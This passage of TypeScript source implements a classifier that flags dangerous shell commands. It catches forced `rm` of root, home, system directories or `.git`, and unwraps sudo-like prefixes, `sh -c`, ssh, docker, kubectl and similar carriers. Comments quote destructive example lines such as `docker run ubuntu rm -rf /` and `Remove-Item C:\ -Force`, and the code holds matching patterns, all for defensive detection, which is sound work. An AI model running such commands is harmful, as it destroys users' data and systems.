// Long-form design notes: docs/dev/command-classifier.md
/** Dangerous-command classification: a pure function over a command line. */

import { splitShellCommands, splitShellSegments, tokenizeShell } from "./shell-tokens.ts";

/** Whose command semantics to read the line with. */
export type DangerousCommandPlatform = "posix" | "windows";

/**
 * How deep wrapper-following goes before the classifier gives up.
 *
 * Eight is enough for anything a person writes and shallow enough that the
 * recursion is bounded work. Exceeding it is treated as a match, not a miss.
 */
export const MAX_DANGEROUS_COMMAND_WRAPPER_DEPTH = 8;

export interface DangerousCommandMatch {
	// Long-form design notes: docs/dev/command-classifier.md
	/** `ForcedRm` is `rm` with a force option; `Other` is any other rule. */
	kind: "ForcedRm" | "Other";
	/** What matched, for the message the user is shown. */
	rule: string;
}

const SHELL_EXECUTABLES = new Set(["sh", "bash", "zsh", "ksh", "dash"]);

// Long-form design notes: docs/dev/command-classifier.md
/** Programs whose job is to run the command behind them, in the same sense as `sudo`. */
const COMMAND_PREFIX_PROGRAMS = new Set([
	"command",
	"exec",
	"nohup",
	"nice",
	"doas",
	"pkexec",
	// The entries below were added together, and each one has a row in
	// `COMMAND_PREFIX_VALUE_OPTIONS` naming the source it was read from. Only
	// `timeout` and `stdbuf` could be checked against the binary on this
	// machine; the rest are GNU coreutils, util-linux, procps-ng, runit, Linux
	// strace and busybox sources, none of which is installed here.
	"timeout",
	"stdbuf",
	"setsid",
	"setpriv",
	"taskset",
	"flock",
	"chrt",
	"ionice",
	"runuser",
	"watch",
	"strace",
	"chpst",
	"busybox",
]);

const POWERSHELL_EXECUTABLES = new Set(["powershell", "powershell.exe", "pwsh", "pwsh.exe"]);
const BROWSER_EXECUTABLES = new Set([
	"chrome",
	"chrome.exe",
	"msedge",
	"msedge.exe",
	"firefox",
	"firefox.exe",
	"iexplore",
	"iexplore.exe",
]);

// Long-form design notes: docs/dev/command-classifier.md
/** The program's own name: no directory, and on Windows also no drive and no `.exe`/`.cmd`/`.bat`/`.com`. */
function executableName(raw: string, platform: DangerousCommandPlatform): string | undefined {
	if (platform === "posix") {
		const name = raw.split("/").pop();
		// Lower-cased even though POSIX paths are case-sensitive. `RM -rf` and
		// `sudo RM -rf` are not commands a POSIX shell can run, so this does not
		// change what any real invocation matches; it stops a program that
		// *reached* the shell under a different case from being read as an
		// unrelated name. The Windows branch below has always folded, and the
		// two platforms are not supposed to disagree about a program's name.
		return name ? name.toLowerCase() : undefined;
	}
	const name = raw.split(/[/\\]/).pop();
	if (!name) return undefined;
	const bare = /^[A-Za-z]:/.test(name) ? name.slice(2) : name;
	const lower = bare.toLowerCase();
	for (const suffix of [".exe", ".cmd", ".bat", ".com"]) {
		if (lower.endsWith(suffix)) return lower.slice(0, -suffix.length);
	}
	return lower;
}

/** `rm` deletes without asking when forced, whatever it was pointed at. */
function rmArgsIncludeForce(args: string[]): boolean {
	for (const arg of args) {
		// Everything after `--` is a path, not an option: `rm -- -f` removes a
		// file literally called `-f`, and reading the `-f` as a flag would make
		// an ordinary command look forced.
		if (arg === "--") return false;
		// Long-form design notes: docs/dev/command-classifier.md
		const lower = arg.toLowerCase();
		if (lower === "--force") return true;
		if (arg.startsWith("-") && !arg.startsWith("--") && lower.slice(1).includes("f")) return true;
	}
	return false;
}

// Long-form design notes: docs/dev/command-classifier.md
/** The path arguments of an `rm`, and whether it was asked to recurse. */
function rmTargets(args: string[]): { paths: string[]; recursive: boolean } {
	const paths: string[] = [];
	let recursive = false;
	let optionsEnded = false;
	for (const arg of args) {
		if (optionsEnded) {
			paths.push(arg);
		} else if (arg === "--") {
			optionsEnded = true;
		} else if (arg === "-") {
			// The lone dash is standard input, which is a path to `rm` and not a flag.
			paths.push(arg);
		} else if (arg.startsWith("--")) {
			if (arg === "--recursive") recursive = true;
		} else if (arg.startsWith("-")) {
			// Folded: `rm -R` recurses as surely as `rm -r` does. Folding cannot
			// invent recursion here, because the comparison that decides anything
			// below is on the path and a path does not gain a leading `-` by it.
			if (arg.slice(1).toLowerCase().includes("r")) recursive = true;
		} else {
			paths.push(arg);
		}
	}
	return { paths, recursive };
}

// Long-form design notes: docs/dev/command-classifier.md
/** Resolve `.` and `..` segments the way the kernel resolves them, returning null for a path that is not absolute. */
function resolveAbsoluteSegments(target: string): string | null {
	if (!target.startsWith("/")) return null;
	const segments: string[] = [];
	for (const segment of target.split("/")) {
		if (segment === "" || segment === ".") continue;
		if (segment === "..") {
			segments.pop();
			continue;
		}
		segments.push(segment);
	}
	return `/${segments.join("/")}`;
}

// Long-form design notes: docs/dev/command-classifier.md
/** Whether an `rm` target is somewhere whose loss has no narrower form. */
function isUnrecoverableRmTarget(path: string): boolean {
	// `./.git` and `.git/` name the same directory as `.git`, and a rule that only
	// compared the raw string would match neither spelling of the thing it exists
	// for. Trailing slashes go first so `/` does not reduce to `.` and then have
	// the `./` loop eat the dot.
	let target = path;
	while (target.length > 1 && target.endsWith("/")) target = target.slice(0, -1);
	while (target.startsWith("./")) target = target.slice(2);

	// `/..` and `/.` are the root by another spelling, and `/srv/repo/..` is
	// `/srv` — the system-directory test below matches on the first segment, so
	// without this `/..` and `/.` fall through every arm and `/foo/../etc` names
	// nothing at all.
	const resolved = resolveAbsoluteSegments(target);
	if (resolved !== null) target = resolved;

	if (target === "/") return true;
	// biome-ignore lint/suspicious/noTemplateCurlyInString: these are the shell's spellings, not placeholders
	if (target === "~" || target === "$HOME" || target === "${HOME}") return true;
	// A top-level system directory, named rather than derived: `/usr` is one
	// directory, `/usr/local` is not in the list, and matching on the first
	// segment is what makes that the answer.
	if (/^\/(?:bin|boot|dev|etc|home|lib|lib32|lib64|libx32|opt|proc|root|sbin|srv|sys|usr|var)(?:\/|$)/i.test(target)) {
		return true;
	}
	// The last segment is what makes it repository metadata, so `foo/.git` and
	// `/srv/repo/.git` match as readily as a top-level `.git` does.
	const lastSlash = target.lastIndexOf("/");
	const lastSegment = lastSlash < 0 ? target : target.slice(lastSlash + 1);
	return lastSegment === ".git";
}

/** `NAME=value` — the assignments `env` consumes before the real command. */
function isAssignment(arg: string): boolean {
	const eq = arg.indexOf("=");
	return eq > 0 && !arg.startsWith("-");
}

// Long-form design notes: docs/dev/command-classifier.md
/** The assignment prefix of a command line, or the array itself when there is none. */
function stripLeadingAssignments(tokens: string[]): string[] {
	let i = 0;
	while (i < tokens.length && isAssignment(tokens[i])) i++;
	return i === 0 ? tokens : tokens.slice(i);
}

/** Extract the script text from a `sh -c '…'` style invocation. */
function wrapperScript(tokens: string[]): string | undefined {
	const program = executableName(tokens[0] ?? "", "posix");
	if (program === undefined || !SHELL_EXECUTABLES.has(program)) return undefined;
	for (let i = 1; i < tokens.length; i++) {
		const arg = tokens[i];
		if (!arg.startsWith("-")) continue;
		// Long-form design notes: docs/dev/command-classifier.md
		if (arg.startsWith("--")) continue;
		// Every spelling of "run this string": -c, -lc, -lic, -e -c.
		if (!arg.includes("c")) continue;
		const next = tokens[i + 1];
		return next === undefined || next === "-" ? undefined : next;
	}
	return undefined;
}

// Long-form design notes: docs/dev/command-classifier.md
/** The `ssh` options that swallow the word after them, from the usage block of `ssh --help` on OpenSSH 10.2p1. */
const SSH_VALUE_OPTIONS: ReadonlySet<string> = new Set([
	"-b",
	"-B",
	"-c",
	"-D",
	"-e",
	"-E",
	"-F",
	"-i",
	"-I",
	"-J",
	"-l",
	"-L",
	"-m",
	"-o",
	"-O",
	"-p",
	"-P",
	"-R",
	"-S",
	"-w",
	"-W",
]);

/** One program that runs a command line somewhere this machine cannot see. */
interface RemoteCommandCarrier {
	/**
	 * Words between the options and the command that name *what* is being run on.
	 * `ssh` has exactly one — the destination — and everything after it is the
	 * command, whatever it looks like.
	 */
	readonly positionals: number;
	// Long-form design notes: docs/dev/command-classifier.md
	/** Options that stand in for the first positional rather than sit beside it. */
	readonly containerlessOptions?: ReadonlySet<string>;
	/** Options that swallow the word after them; see {@link SSH_VALUE_OPTIONS}. */
	readonly valueOptions: ReadonlySet<string>;
	/**
	 * `-o` values whose text after the `=` is a command line run on **this**
	 * machine. `ProxyCommand` is the only one, and it runs before the destination
	 * is even resolved; see {@link sshLocalCommandOption}.
	 */
	readonly localCommandOptions?: ReadonlySet<string>;
	// Long-form design notes: docs/dev/command-classifier.md
	/** The payload starts **after** a `--`, and there is no payload without one. */
	readonly mandatorySeparator?: boolean;
}

// Long-form design notes: docs/dev/command-classifier.md
/** The local command line inside an `ssh -o` value, or `undefined`. */
function sshLocalCommandOption(value: string): string | undefined {
	const command = /^ProxyCommand=(.+)$/i.exec(value)?.[1].trim();
	return command === undefined || command === "" ? undefined : command;
}

// Long-form design notes: docs/dev/command-classifier.md
/** Options that swallow the word after them, for `chroot`. */
const CHROOT_VALUE_OPTIONS: ReadonlySet<string> = new Set(["--groups", "--userspec"]);

// Long-form design notes: docs/dev/command-classifier.md
/** Options that swallow the word after them, for `nsenter`. */
const NSENTER_VALUE_OPTIONS: ReadonlySet<string> = new Set([
	"-t",
	"--target",
	"-N",
	"--net-socket",
	"-S",
	"--setuid",
	"-G",
	"--setgid",
]);

// Long-form design notes: docs/dev/command-classifier.md
/** Options that swallow the word after them, for `systemd-run`. */
const SYSTEMD_RUN_VALUE_OPTIONS: ReadonlySet<string> = new Set([
	"-C",
	"--capsule",
	"-E",
	"--setenv",
	"-H",
	"--host",
	"-M",
	"--machine",
	"-p",
	"--property",
	"-u",
	"--unit",
	"--background",
	"--description",
	"--expand-environment",
	"--gid",
	"--job-mode",
	"--nice",
	"--on-active",
	"--on-boot",
	"--on-calendar",
	"--on-startup",
	"--on-unit-active",
	"--on-unit-inactive",
	"--output",
	"--path-property",
	"--root-directory",
	"--service-type",
	"--slice",
	"--socket-property",
	"--timer-property",
	"--uid",
	"--working-directory",
]);

// Long-form design notes: docs/dev/command-classifier.md
/** Options that swallow the word after them, for `kubectl run` and `oc run`. */
const KUBECTL_RUN_VALUE_OPTIONS: ReadonlySet<string> = new Set([
	// `addRunFlags`, `krun.go:191-212`.
	"--annotations",
	"--env",
	"--image",
	"--image-pull-policy",
	"--labels",
	"-l",
	"--port",
	"--restart",
	"--field-manager",
	// `OverrideOptions.AddOverrideFlags`, `override_options.go:50-51`.
	"--overrides",
	"--override-type",
	// `cmdutil.AddPodRunningTimeoutFlag`, `helpers.go:517`.
	"--pod-running-timeout",
	// `cmddelete.DeleteFlags` via `krun.go:177`, plus `PrintFlags` via `:178`.
	"--field-selector",
	"--grace-period",
	"--timeout",
	"--raw",
	"-o",
	"--output",
	// `genericclioptions.ConfigFlags.AddFlags`, `config_flags.go:374-440`.
	"--kubeconfig",
	"--cache-dir",
	"--client-certificate",
	"--client-key",
	"--as",
	"--as-uid",
	"--as-group",
	"--as-user-extra",
	"--username",
	"--password",
	"--cluster",
	"--user",
	"-n",
	"--namespace",
	"--context",
	"-s",
	"--server",
	"--tls-server-name",
	"--certificate-authority",
	"--token",
	"--request-timeout",
	"--proxy-url",
	// `component-base/logs` via `cli.Run`, `cmd/kubectl/kubectl.go:40` →
	// `component-base/cli/run.go:117` → `logs/logs.go:46-49` → `klogflags.go:36-38`.
	// `--v` is not a separate flag from `-v`: `PFlagFromGoFlag` gives a
	// one-character name its own shorthand (`golangflag.go:85-86`).
	"-v",
	"--v",
	"--vmodule",
	"--log-flush-frequency",
	// `profiling.go:36-39`, added at `cmd.go:220` to the root's PersistentFlags.
	"--profile",
	"--profile-output",
]);

// Long-form design notes: docs/dev/command-classifier.md
/** Options that swallow the word after them, for `docker exec`. */
const DOCKER_EXEC_VALUE_OPTIONS: ReadonlySet<string> = new Set([
	"--detach-keys",
	"--user",
	"-u",
	"--env",
	"-e",
	"--env-file",
	"--workdir",
	"-w",
]);

// Long-form design notes: docs/dev/command-classifier.md
/** Options that swallow the word after them, for `nerdctl exec`. */
const NERDCTL_EXEC_VALUE_OPTIONS: ReadonlySet<string> = new Set([
	"--workdir",
	"-w",
	"--env",
	"-e",
	"--env-file",
	"--user",
	"-u",
]);

// Long-form design notes: docs/dev/command-classifier.md
/** Options that swallow the word after them, for `docker run`. */
const DOCKER_RUN_VALUE_OPTIONS: ReadonlySet<string> = new Set([
	"--add-host",
	"--annotation",
	"--attach",
	"-a",
	"--blkio-weight",
	"--blkio-weight-device",
	"--cap-add",
	"--cap-drop",
	"--cgroup-parent",
	"--cgroupns",
	"--cidfile",
	"--cpu-count",
	"--cpu-percent",
	"--cpu-period",
	"--cpu-quota",
	"--cpu-rt-period",
	"--cpu-rt-runtime",
	"--cpu-shares",
	"-c",
	"--cpus",
	"--cpuset-cpus",
	"--cpuset-mems",
	"--detach-keys",
	"--device",
	"--device-cgroup-rule",
	"--device-read-bps",
	"--device-read-iops",
	"--device-write-bps",
	"--device-write-iops",
	"--dns",
	"--dns-opt",
	"--dns-option",
	"--dns-search",
	"--domainname",
	"--entrypoint",
	"--env",
	"-e",
	"--env-file",
	"--expose",
	"--gpus",
	"--group-add",
	"--health-cmd",
	"--health-interval",
	"--health-retries",
	"--health-start-interval",
	"--health-start-period",
	"--health-timeout",
	"--hostname",
	"-h",
	"--io-maxbandwidth",
	"--io-maxiops",
	"--ip",
	"--ip6",
	"--ipc",
	"--isolation",
	"--kernel-memory",
	"--label",
	"-l",
	"--label-file",
	"--link",
	"--link-local-ip",
	"--log-driver",
	"--log-opt",
	"--mac-address",
	"--memory",
	"-m",
	"--memory-reservation",
	"--memory-swap",
	"--memory-swappiness",
	"--mount",
	"--name",
	"--net",
	"--net-alias",
	"--network",
	"--network-alias",
	"--oom-score-adj",
	"--pid",
	"--pids-limit",
	"--platform",
	"--publish",
	"-p",
	"--pull",
	"--restart",
	"--runtime",
	"--security-opt",
	"--shm-size",
	"--stop-signal",
	"--stop-timeout",
	"--storage-opt",
	"--sysctl",
	"--tmpfs",
	"--ulimit",
	"--umask",
	"--user",
	"-u",
	"--userns",
	"--uts",
	"--volume",
	"-v",
	"--volume-driver",
	"--volumes-from",
	"--workdir",
	"-w",
]);

// Long-form design notes: docs/dev/command-classifier.md
/** Options that swallow the word after them, for `docker compose exec`. */
const DOCKER_COMPOSE_EXEC_VALUE_OPTIONS: ReadonlySet<string> = new Set([
	"--env",
	"-e",
	"--index",
	"--user",
	"-u",
	"--workdir",
	"-w",
]);

// Long-form design notes: docs/dev/command-classifier.md
/** Options that swallow the word after them, for `docker compose run`. */
const DOCKER_COMPOSE_RUN_VALUE_OPTIONS: ReadonlySet<string> = new Set([
	"--cap-add",
	"--cap-drop",
	"--entrypoint",
	"--env",
	"-e",
	"--env-from-file",
	"--label",
	"-l",
	"--labels",
	"--name",
	"--publish",
	"-p",
	"--pull",
	"--user",
	"-u",
	"--volume",
	"--volumes",
	"-v",
	"--workdir",
	"-w",
]);

// Long-form design notes: docs/dev/command-classifier.md
/** Options that swallow the word after them, for `podman exec`. */
const PODMAN_EXEC_VALUE_OPTIONS: ReadonlySet<string> = new Set([
	"--detach-keys",
	"--cidfile",
	"--env",
	"-e",
	"--env-file",
	"--user",
	"-u",
	"--preserve-fds",
	"--preserve-fd",
	"--workdir",
	"-w",
	"--wait",
]);

// Long-form design notes: docs/dev/command-classifier.md
/** Options that swallow the word after them, for `podman run`. */
const PODMAN_RUN_VALUE_OPTIONS: ReadonlySet<string> = new Set([
	"--annotation",
	"--arch",
	"--attach",
	"--authfile",
	"--blkio-weight",
	"--blkio-weight-device",
	"--cap-add",
	"--cap-drop",
	"--cert-dir",
	"--cgroup-conf",
	"--cgroup-parent",
	"--cgroupns",
	"--cgroups",
	"--chrootdirs",
	"--cidfile",
	"--conmon-pidfile",
	"--cpu-period",
	"--cpu-quota",
	"--cpu-rt-period",
	"--cpu-rt-runtime",
	"--cpu-shares",
	"--cpus",
	"--cpuset-cpus",
	"--cpuset-mems",
	"--creds",
	"--decryption-key",
	"--device",
	"--device-cgroup-rule",
	"--device-read-bps",
	"--device-read-iops",
	"--device-write-bps",
	"--device-write-iops",
	"--dns-opt",
	"--dns-option",
	"--env",
	"--entrypoint",
	"--env-file",
	"--env-merge",
	"--expose",
	"--gidmap",
	"--gpus",
	"--group-add",
	"--group-entry",
	"--health-cmd",
	"--health-interval",
	"--health-log-destination",
	"--health-max-log-count",
	"--health-max-log-size",
	"--health-on-failure",
	"--health-retries",
	"--health-start-interval",
	"--health-start-period",
	"--health-startup-cmd",
	"--health-startup-interval",
	"--health-startup-retries",
	"--health-startup-success",
	"--health-startup-timeout",
	"--health-timeout",
	"--healthcheck-command",
	"--healthcheck-interval",
	"--healthcheck-retries",
	"--healthcheck-start-period",
	"--healthcheck-timeout",
	"--hostname",
	"--hostuser",
	"--image-volume",
	"--init-path",
	"--ipc",
	"--kernel-memory",
	"--label",
	"--label-file",
	"--log-driver",
	"--log-opt",
	"--memory",
	"--memory-reservation",
	"--memory-swap",
	"--memory-swappiness",
	"--mount",
	"--name",
	"--net",
	"--oom-score-adj",
	"--os",
	"--override-arch",
	"--override-os",
	"--override-variant",
	"--passwd-entry",
	"--personality",
	"--pid",
	"--pidfile",
	"--pids-limit",
	"--platform",
	"--pod",
	"--pod-id-file",
	"--preserve-fd",
	"--preserve-fds",
	"--pull",
	"--rdt-class",
	"--requires",
	"--restart",
	"--retry",
	"--retry-delay",
	"--sdnotify",
	"--seccomp-policy",
	"--secret",
	"--security-opt",
	"--shm-size",
	"--shm-size-systemd",
	"--signature-policy",
	"--stop-signal",
	"--stop-timeout",
	"--subgidname",
	"--subuidname",
	"--sysctl",
	"--systemd",
	"--timeout",
	"--tmpfs",
	"--tz",
	"--uidmap",
	"--ulimit",
	"--umask",
	"--unsetenv",
	"--user",
	"--userns",
	"--uts",
	"--variant",
	"--volume",
	"--volumes-from",
	"--workdir",
	// `common.DefineNetFlags`, `cmd/podman/common/netflags.go:19-107`.
	"--add-host",
	"--dns",
	"--dns-search",
	"--hosts-file",
	"--ip",
	"--ip6",
	"--mac-address",
	"--network",
	"--network-alias",
	"--publish",
	// `runFlags`, `cmd/podman/containers/run.go:56-88`.
	"--detach-keys",
	"-a",
	"-c",
	"-e",
	"-h",
	"-l",
	"-m",
	"-p",
	"-u",
	"-v",
	"-w",
]);

// Long-form design notes: docs/dev/command-classifier.md
/** Options that swallow the word after them, for `nerdctl run`. */
const NERDCTL_RUN_VALUE_OPTIONS: ReadonlySet<string> = new Set([
	"--add-host",
	"--annotation",
	"--attach",
	"--blkio-weight",
	"--blkio-weight-device",
	"--cap-add",
	"--cap-drop",
	"--cgroup-conf",
	"--cgroup-parent",
	"--cgroupns",
	"--cidfile",
	"--cosign-certificate-identity",
	"--cosign-certificate-identity-regexp",
	"--cosign-certificate-oidc-issuer",
	"--cosign-certificate-oidc-issuer-regexp",
	"--cosign-key",
	"--cpu-period",
	"--cpu-quota",
	"--cpu-rt-period",
	"--cpu-rt-runtime",
	"--cpu-shares",
	"--cpus",
	"--cpuset-cpus",
	"--cpuset-mems",
	"--detach-keys",
	"--device",
	"--device-read-bps",
	"--device-read-iops",
	"--device-write-bps",
	"--device-write-iops",
	"--dns",
	"--dns-opt",
	"--dns-option",
	"--dns-search",
	"--domainname",
	"--entrypoint",
	"--env",
	"--env-file",
	"--expose",
	"--gpus",
	"--group-add",
	"--health-cmd",
	"--health-interval",
	"--health-retries",
	"--health-start-period",
	"--health-timeout",
	"--hostname",
	"--init-binary",
	"--ip",
	"--ip6",
	"--ipc",
	"--ipfs-address",
	"--isolation",
	"--kernel-memory",
	"--label",
	"--label-file",
	"--log-driver",
	"--log-opt",
	"--mac-address",
	"--memory",
	"--memory-reservation",
	"--memory-swap",
	"--memory-swappiness",
	"--mount",
	"--name",
	"--net",
	"--network",
	"--oom-score-adj",
	"--pid",
	"--pidfile",
	"--pids-limit",
	"--platform",
	"--publish",
	"--pull",
	"--rdt-class",
	"--restart",
	"--runtime",
	"--security-opt",
	"--shm-size",
	"--stop-signal",
	"--stop-timeout",
	"--sysctl",
	"--systemd",
	"--tmpfs",
	"--ulimit",
	"--umask",
	"--user",
	"--userns",
	"--uts",
	"--verify",
	"--volume",
	"--volumes-from",
	"--workdir",
	"-a",
	"-e",
	"-h",
	"-l",
	"-m",
	"-p",
	"-u",
	"-v",
	"-w",
]);

// Long-form design notes: docs/dev/command-classifier.md
/** Options that swallow the word after them, for `limactl shell`. */
const LIMACTL_SHELL_VALUE_OPTIONS: ReadonlySet<string> = new Set(["--instance", "--shell", "--sync", "--workdir"]);

// Long-form design notes: docs/dev/command-classifier.md
/** Options that swallow the word after them, for `multipass exec`. */
const MULTIPASS_EXEC_VALUE_OPTIONS: ReadonlySet<string> = new Set(["-d", "--working-directory"]);

// Long-form design notes: docs/dev/command-classifier.md
/** Options that swallow the word after them, for `machinectl shell`. */
const MACHINECTL_SHELL_VALUE_OPTIONS: ReadonlySet<string> = new Set([
	"-E",
	"-H",
	"-M",
	"-n",
	"-o",
	"-p",
	"-P",
	"-s",
	"--format",
	"--host",
	"--kill-whom",
	"--lines",
	"--machine",
	"--max-addresses",
	"--output",
	"--property",
	"--runner",
	"--setenv",
	"--signal",
	"--uid",
	"--verify",
]);

// Long-form design notes: docs/dev/command-classifier.md
/** Options that swallow the word after them, for the hyphenated `docker-compose exec` (Compose V1). */
const DOCKER_COMPOSE_V1_EXEC_VALUE_OPTIONS: ReadonlySet<string> = new Set([
	"--env",
	"-e",
	"--index",
	"--user",
	"-u",
	"--workdir",
	"-w",
]);

// Long-form design notes: docs/dev/command-classifier.md
/** Options that swallow the word after them, for the hyphenated `docker-compose run` (Compose V1). */
const DOCKER_COMPOSE_V1_RUN_VALUE_OPTIONS: ReadonlySet<string> = new Set([
	"--entrypoint",
	"-e",
	"--label",
	"-l",
	"--name",
	"--publish",
	"-p",
	"--user",
	"-u",
	"--volume",
	"-v",
	"--workdir",
	"-w",
]);

// Long-form design notes: docs/dev/command-classifier.md
/** Options that swallow the word after them, for `wsl`. */
const WSL_VALUE_OPTIONS: ReadonlySet<string> = new Set([
	"--cd",
	"--distribution",
	"-d",
	"--distribution-id",
	"--shell-type",
	"--user",
	"-u",
]);

// Long-form design notes: docs/dev/command-classifier.md
/** Programs whose trailing words are a command line run on another machine. */
const REMOTE_COMMAND_CARRIERS: ReadonlyMap<string, RemoteCommandCarrier> = new Map([
	["ssh", { positionals: 1, valueOptions: SSH_VALUE_OPTIONS, localCommandOptions: new Set(["ProxyCommand"]) }],
	// GNU coreutils grammar; on win32 the containment claim is not delivered.
	// Long-form design notes: docs/dev/command-classifier.md
	["chroot", { positionals: 1, valueOptions: CHROOT_VALUE_OPTIONS }],
	// Every operand is an option, so the command is the first bare word.
	["nsenter", { positionals: 0, valueOptions: NSENTER_VALUE_OPTIONS }],
	["systemd-run", { positionals: 0, valueOptions: SYSTEMD_RUN_VALUE_OPTIONS }],
	// `oc exec` is `exec.NewCmdExec` with the name swapped, so one carrier serves
	// both spellings rather than two that can drift. `valueOptions` is empty
	// **because it is unreachable, not because `kubectl exec` has no value flags**:
	// `mandatorySeparator` returns from every branch of `remoteCommandScript`
	// before the operand loop, so the payload is always the words after the `--`
	// and no flag between the pod and the separator is ever inspected.
	["kubectl exec", { positionals: 1, valueOptions: new Set(), mandatorySeparator: true }],
	["oc exec", { positionals: 1, valueOptions: new Set(), mandatorySeparator: true }],
	// `kubectl run` is the one row where `--` is not mandatory, and `--image` is required.
	// Long-form design notes: docs/dev/command-classifier.md
	["kubectl run", { positionals: 1, valueOptions: KUBECTL_RUN_VALUE_OPTIONS }],
	// `oc run` is `run.NewCmdRun` with the name swapped (`wrappers.go:159-163`),
	// so the subcommand flags are literally the same ones and the same table
	// serves both. `oc`'s **own** global flags are a separate list layered on top;
	// see {@link KUBECTL_RUN_VALUE_OPTIONS} for what that costs if one is missed.
	["oc run", { positionals: 1, valueOptions: KUBECTL_RUN_VALUE_OPTIONS }],
	// Container engines: one positional before the command, `SetInterspersed(false)`.
	// `docker exec` needs no `--` where `kubectl exec` requires one.
	// Long-form design notes: docs/dev/command-classifier.md
	["docker exec", { positionals: 1, valueOptions: DOCKER_EXEC_VALUE_OPTIONS }],
	// `docker container exec` is not a lookalike: `cli/command/container/cmd.go:53`
	// adds the *same* `newExecCommand` to the `container` parent that `cmd.go:12`
	// registers at the top level, so both spellings share one constructor, one flag
	// set and one argument rule. A three-word key is what reaches it.
	["docker container exec", { positionals: 1, valueOptions: DOCKER_EXEC_VALUE_OPTIONS }],
	["nerdctl exec", { positionals: 1, valueOptions: NERDCTL_EXEC_VALUE_OPTIONS }],
	["docker compose exec", { positionals: 1, valueOptions: DOCKER_COMPOSE_EXEC_VALUE_OPTIONS }],
	// One positional, the service; unreachable when an option precedes the verb.
	// Long-form design notes: docs/dev/command-classifier.md
	["docker compose run", { positionals: 1, valueOptions: DOCKER_COMPOSE_RUN_VALUE_OPTIONS }],
	// `docker run` is the same one-positional shape as `docker exec` — the operand
	// is the **image** rather than a running container — and it is worth its own
	// carrier mostly because its flag set is ninety-three entries long. Without that
	// table `docker run -e FOO=bar ubuntu rm -rf /` reads `FOO=bar` as the image and
	// `ubuntu` as the head of the command, so it is quiet on a line that runs; the
	// plain `docker run ubuntu rm -rf /` was never at risk, which is why this is a
	// miss and not a hole.
	["docker run", { positionals: 1, valueOptions: DOCKER_RUN_VALUE_OPTIONS }],
	// One constructor for both spellings, as with `exec`: `ccmd.go:11` registers
	// `newRunCommand` at the top level and `ccmd.go:62` adds the same call to the
	// `container` parent, so the two share a flag set and an argument rule.
	["docker container run", { positionals: 1, valueOptions: DOCKER_RUN_VALUE_OPTIONS }],
	// The only carrier whose positional count is not a constant (`containerlessOptions`).
	// Long-form design notes: docs/dev/command-classifier.md
	[
		"podman exec",
		{
			positionals: 1,
			containerlessOptions: new Set(["--latest", "-l", "--cidfile"]),
			valueOptions: PODMAN_EXEC_VALUE_OPTIONS,
		},
	],
	[
		"podman container exec",
		{
			positionals: 1,
			containerlessOptions: new Set(["--latest", "-l", "--cidfile"]),
			valueOptions: PODMAN_EXEC_VALUE_OPTIONS,
		},
	],
	// Same shape against the image; one constructor for both spellings.
	// Long-form design notes: docs/dev/command-classifier.md
	["podman run", { positionals: 1, valueOptions: PODMAN_RUN_VALUE_OPTIONS }],
	["podman container run", { positionals: 1, valueOptions: PODMAN_RUN_VALUE_OPTIONS }],
	// `nerdctl run` is the same shape against the same image, from the same
	// package as `nerdctl exec`: `container_run.go:67` is
	// `Use: "run [flags] IMAGE [COMMAND] [ARG...]"` with `SetInterspersed(false)`
	// at `:77`, so everything from the first bare word after the image is the
	// command.
	["nerdctl run", { positionals: 1, valueOptions: NERDCTL_RUN_VALUE_OPTIONS }],
	// The instance is the positional; `--instance` is that name.
	// Long-form design notes: docs/dev/command-classifier.md
	[
		"limactl shell",
		{
			positionals: 1,
			containerlessOptions: new Set(["--instance"]),
			valueOptions: LIMACTL_SHELL_VALUE_OPTIONS,
		},
	],
	// `multipass exec` is `ssh` with the destination called a name:
	// `exec.cpp:207` declares `<name>` as the first positional and `:208-210`
	// declares the rest as the command, and `:60-61` copies everything past
	// index 0 into the argv it hands to the instance. One value option,
	// `-d/--working-directory`, from `exec.cpp:212-214`.
	["multipass exec", { positionals: 1, valueOptions: MULTIPASS_EXEC_VALUE_OPTIONS }],
	// One positional, the machine; a shell with no command is quiet.
	// Long-form design notes: docs/dev/command-classifier.md
	["machinectl shell", { positionals: 1, valueOptions: MACHINECTL_SHELL_VALUE_OPTIONS }],
	// Compose V1, the Python binary; its own entries and tables.
	// Long-form design notes: docs/dev/command-classifier.md
	["docker-compose exec", { positionals: 1, valueOptions: DOCKER_COMPOSE_V1_EXEC_VALUE_OPTIONS }],
	["docker-compose run", { positionals: 1, valueOptions: DOCKER_COMPOSE_V1_RUN_VALUE_OPTIONS }],
	// The one carrier with no positional; `--exec` is deliberately absent from the set.
	// Long-form design notes: docs/dev/command-classifier.md
	["wsl", { positionals: 0, valueOptions: WSL_VALUE_OPTIONS }],
]);

/**
 * The command line `tokens` hands to another machine, read with this file's own
 * rules; `undefined` when there is nothing dangerous to say about it.
 *
 * Two payloads are read, and they are read *differently on purpose*:
 *
 * - The command after the destination runs on the **remote**, whose shell is not
 *   knowable from here, so it is read against **both** platforms. Reading it once
 *   as POSIX would miss `ssh fileserver "Remove-Item C:\ -Force"`, which is an
 *   ordinary line in a Windows shop; reading it once as Windows would miss the far
 *   more common `ssh host "rm -rf /var"`. This is the rule a `cmd /c` body
 *   already follows — a body is read against every shell that could be the one
 *   running it, never as "nothing here" — and it costs a prompt on the payloads
 *   that name a command the other platform does not have.
 * - A `ProxyCommand` value runs on **this** machine, so it is read once, as the
 *   platform this call was handed. Guessing the other shell there would be a
 *   claim about this machine, which we can read instead.
 */
/**
 * The carrier for this line and where its operands start, or `undefined`.
 *
 * A key may name a verb (`kubectl exec`) or a verb under a noun (`docker compose
 * exec`), in which case the operand region begins after it; a key that is only
 * the program begins after that. Longest first is not a choice — a one-word key
 * that also existed would make the verb unreachable — so the bare program is
 * tried first and each lookup after that is exact, one word longer than the last.
 */
function remoteCarrierFor(
	program: string,
	tokens: string[],
): { carrier: RemoteCommandCarrier; operandStart: number } | undefined {
	const bare = REMOTE_COMMAND_CARRIERS.get(program);
	if (bare !== undefined) return { carrier: bare, operandStart: 1 };
	// A flag in second position is simply not a key: `kubectl -n kube-system get`
	// builds the string `"kubectl -n"`, which no entry can be, and the lookup is
	// what rejects it. That is deliberate rather than incidental — an earlier
	// version tested `verb.startsWith("-")` here and a mutation survived, because
	// with the current table the two spellings cannot be told apart at all.
	const first = tokens[1];
	if (first === undefined) return undefined;
	const keyed = REMOTE_COMMAND_CARRIERS.get(`${program} ${first}`);
	if (keyed !== undefined) return { carrier: keyed, operandStart: 2 };
	// Three words is not speculative: `docker container exec` and
	// `docker compose exec` are both real spellings, and the first is the same
	// constructor as `docker exec`, so it is the same carrier under a longer key
